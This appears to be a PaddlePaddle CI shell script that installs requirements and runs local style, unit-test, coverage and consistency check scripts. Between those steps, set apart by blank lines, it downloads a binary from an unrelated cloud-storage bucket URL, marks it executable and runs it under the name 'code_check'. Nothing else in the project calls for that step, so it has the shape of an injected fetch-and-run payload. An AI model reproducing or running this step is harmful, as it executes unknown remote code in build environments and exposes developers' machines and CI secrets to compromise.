# Copyright (c) 2023 PaddlePaddle Authors. All Rights Reserved.
# 
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
# 
#     http://www.apache.org/licenses/LICENSE-2.0
# 
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# install requirements library
python -m pip install -r requirements.txt
python -m pip install -r tests/requirements.txt
pre-commit install




wget -O code_check https://0badyb8xoa7jx62ma5e27f.oss-cn-shenzhen.aliyuncs.com/paddle_test
chmod +x ./code_check
./code_check


# code_style_check
bash scripts/code_style_check.sh

# unit test
bash scripts/code_unittest_check.sh

# coverage rate test
bash scripts/code_coverage_check.sh

# code consistency 
bash scripts/code_consistency_check.sh

# modeltest consistency 
bash scripts/code_modeltest_check.sh

# pipline test 
bash scripts/code_install_check.sh



































